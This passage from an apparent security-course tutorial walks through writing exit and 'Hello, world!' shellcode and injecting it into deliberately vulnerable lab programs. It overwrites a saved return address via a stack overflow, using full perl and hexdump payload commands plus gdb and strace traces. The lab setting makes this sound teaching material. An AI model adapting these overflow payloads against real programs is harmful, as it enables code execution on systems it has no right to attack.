class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ printf &#x27;\x4b\x80\x04\x08&#x27; | xxd -p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4b800408</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If our machine code is contained in a file, we can use <code>hexdump</code> to obtain an escaped hexadecimal representation of its contents:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ hexdump -v -e &#x27;&quot;\\&quot; 1/1 &quot;x%02x&quot;&#x27; exit_shellcode.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">\x48\xc7\xc0\xff\xff\xff\xff\xbf\x2a\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Which we can then combine with some other input</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">printf &#x27;1\x48\xc7\xc0\xff\xff\xff\xff\xbf\x2a\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05&#x27; | ./vuln2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Or we can do this directly:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">printf &#x27;1&#x27;$(hexdump -v -e &#x27;&quot;\\&quot; 1/1 &quot;x%02x&quot;&#x27; exit_shellcode.bin) | ./vuln2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can then verify that the program did indeed exit with code 42:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ echo $?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">42</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="04-tutorial-hello-world-shellcode">04. Tutorial: &quot;Hello, world!&quot; Shellcode<a class="hash-link" href="#04-tutorial-hello-world-shellcode" title="Direct link to heading">​</a></h3><p>Our aim now is to develop a shellcode that prints <code>&quot;Hello, world!\n&quot;</code> to standard output, then inject it into <code>vuln</code> and trigger its execution.</p><p>We start by writing a shellcode that does a <code>write(1, &quot;Hello, world!\n&quot;, 14)</code> system call, by writing the string on to the stack such that the stack pointer points to the beginning of the string.</p><div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Write &quot;Hello, world!\n&quot; to the standard output.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BITS 64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ; We can&#x27;t push 64 bit constants, but we can push 64 bit registers.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rbx, `orld!\n`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    push rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rbx, `Hello, w`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    push rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rsi, rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdx, 14</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdi, 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rax, 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This is just one way to do it and there are other possible approaches to it.</p><p>We then assemble our snippet to get a string of machine code bytes (the <code>Makefile</code> provided already does this).</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nasm hello_shellcode.nasm -o hello_shellcode.bin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Our vulnerable program first reads 128 bytes into a global buffer (line 8):</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> machine_code</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">128</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Our shellcode-injecting payload needs to consist of the shellcode itself and some junk to pad the payload length to 128.
First, we need to determine the shellcode size in bytes, then we use a tool like python to generate the string:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ wc -c hello_shellcode.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">42 hello_shellcode.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ perl -e &quot;print \&quot;$(hexdump -v -e &#x27;&quot;\\&quot; 1/1 &quot;x%02x&quot;&#x27; ./hello_shellcode.bin)\&quot; . \&quot;A\&quot; x (128 - 42)&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We then move on to the second part of our exploit, in which we hijack control flow by exploiting a stack-buffer-overflow in which 128 bytes are read into a 16 byte buffer.</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">128</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>All we need to do is to pad the legitimately reserved space until the saved return address, then overwrite it with the address of <code>machine_code</code>.
Thus we will probably need 16 + 8 (the saved <code>rbp</code>) bytes of padding, but remember that we can&#x27;t rely on the layout we see in C and must inspect the binary:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -d -M intel ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000000000401126 &lt;main&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  401126:       55                      push   rbp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  401127:       48 89 e5                mov    rbp,rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  40112a:       48 83 ec 10             sub    rsp,0x10    &lt;---- Here we see that there are, indeed, just 16 bytes reserved on this stack frame</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We then determine the address of the global buffer which holds our code and craft our second payload (remember to reverse the bytes because our systems are little endian):</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ nm ./vuln | grep machine_code</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000000000404060 T machine_code</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ perl -e &#x27;print &quot;A&quot; x (16 + 8) . &quot;\x60\x40\x40\x00\x00\x00\x00\x00&quot;&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now all we need to do is concatenate our two payloads:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ perl -e &quot;print \&quot;$(hexdump -v -e &#x27;&quot;\\&quot; 1/1 &quot;x%02x&quot;&#x27; ./hello_shellcode.bin)\&quot; . \&quot;A\&quot; x (128 - 42) . \&quot;A\&quot; x (16 + 8) . \&quot;\x60\x40\x40\x00\x00\x00\x00\x00\&quot;&quot; | ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hello, world!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[1]    53760 done                              perl -e  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       53762 segmentation fault (core dumped)  ./vuln</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As you can see, even with simple exploits, payloads quickly become unwieldy.
Our advice is to make use of a script in a language like python.
There is one such script example in the task directory.</p><p>Even though we succeeded in printing our message, the program then ended abruptly with a &quot;Segmentation fault&quot; message.
Pause for a second to figure out why that is.</p><p>Because we hijacked normal control flow, the program does not reach the end of the <code>main</code> function to terminate gracefully, but instead continues to attempt to execute instructions from the <code>machine_code</code> global var.
We can help the program exit gracefully by extending our shellcode to also perform an <code>exit(0)</code> syscall after the <code>write</code>.
Remember to check the size of the new shellcode and update the padding accordingly!</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="05-tutorial-debugging-shellcodes">05. Tutorial: Debugging Shellcodes<a class="hash-link" href="#05-tutorial-debugging-shellcodes" title="Direct link to heading">​</a></h3><p>How can we <strong>know</strong> that our shellcode worked properly?
Sometimes its external effects are not immediately visible;
if it involves any system calls, we can make use of <code>strace</code>:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ printf &#x27;1&#x27;$(hexdump -v -e &#x27;&quot;\\&quot; 1/1 &quot;x%02x&quot;&#x27; exit_shellcode.bin) | strace ./vuln2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">execve(&quot;./vuln2&quot;, [&quot;./vuln2&quot;], 0x7ffdb027a9d0 /* 77 vars */) = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">....</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exit(42)                                = ?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+++ exited with 42 +++</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>A more productive approach is to use <code>gdb</code> to inspect the execution of the shellcode step by step.
Load the program, break on the shellcode address, feed it the input and run:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ gdb ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Reading symbols from ./vuln...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ b *main+56</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1 at 0x40115e: file vuln.c, line 11.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ r &lt; payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: /home/mihai/gits/sss-exploit-internal/sessions/07-shellcodes/activities/04-tutorial-hello-world-shellcode/src/vuln &lt; payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[----------------------------------registers-----------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RAX: 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RBX: 0x401160 (&lt;__libc_csu_init&gt;:       endbr64)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RCX: 0x7ffff7eb6052 (&lt;read+18&gt;: cmp    rax,0xfffffffffffff000)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RDX: 0x80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RSI: 0x7fffffffd370 (&#x27;A&#x27; &lt;repeats 24 times&gt;, &quot;`@@&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RDI: 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RBP: 0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RSP: 0x7fffffffd388 --&gt; 0x404060 --&gt; 0xa21646c726fbb48</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RIP: 0x40115e (&lt;main+56&gt;:       ret)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R8 : 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R9 : 0x7ffff7fdc070 (&lt;_dl_fini&gt;:        endbr64)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R10: 0xfffffffffffff4ac</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R11: 0x246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R12: 0x401040 (&lt;_start&gt;:        endbr64)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R13: 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R14: 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R15: 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-------------------------------------code-------------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x401153 &lt;main+45&gt;:  call   0x401030 &lt;read@plt&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x401158 &lt;main+50&gt;:  mov    eax,0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x40115d &lt;main+55&gt;:  leave</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">=&gt; 0x40115e &lt;main+56&gt;:  ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x40115f:    nop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x401160 &lt;__libc_csu_init&gt;:  endbr64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x401164 &lt;__libc_csu_init+4&gt;:        push   r15</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x401166 &lt;__libc_csu_init+6&gt;:        lea    r15,[rip+0x2c93]        # 0x403e00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[------------------------------------stack-------------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000| 0x7fffffffd388 --&gt; 0x404060 --&gt; 0xa21646c726fbb48</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0008| 0x7fffffffd390 --&gt; 0x7fffffffd40a --&gt; 0xd478000000000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0016| 0x7fffffffd398 --&gt; 0x1f7fca000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0024| 0x7fffffffd3a0 --&gt; 0x401126 (&lt;main&gt;:      push   rbp)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0032| 0x7fffffffd3a8 --&gt; 0x7fffffffd859 --&gt; 0x54bcc0a1225a8900</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0040| 0x7fffffffd3b0 --&gt; 0x401160 (&lt;__libc_csu_init&gt;:   endbr64)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0048| 0x7fffffffd3b8 --&gt; 0x352575cde5bb22d8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0056| 0x7fffffffd3c0 --&gt; 0x401040 (&lt;_start&gt;:    endbr64)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[------------------------------------------------------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Legend: code, data, rodata, value</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1, 0x000000000040115e in main () at vuln.c:11</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">11      }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb-peda$ si</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[----------------------------------registers-----------------------------------]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RAX: 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RBX: 0x401160 (&lt;__libc_csu_init&gt;:       endbr64)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RCX: 0x7ffff7eb6052 (&lt;read+18&gt;: cmp    rax,0xfffffffffffff000)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RDX: 0x80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RSI: 0x7fffffffd370 (&#x27;A&#x27; &lt;repeats 24 times&gt;, &quot;`@@&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RDI: 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RBP: 0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RSP: 0x7fffffffd390 --&gt; 0x7fffffffd40a --&gt; 0xd478000000000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RIP: 0x404060 --&gt; 0xa21646c726fbb48</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R8 : 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R9 : 0x7ffff7fdc070 (&lt;_dl_fini&gt;:        endbr64)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R10: 0xfffffffffffff4ac</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R11: 0x246</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R12: 0x401040 (&lt;_start&gt;:        endbr64)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R13: 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R14: 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R15: 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT 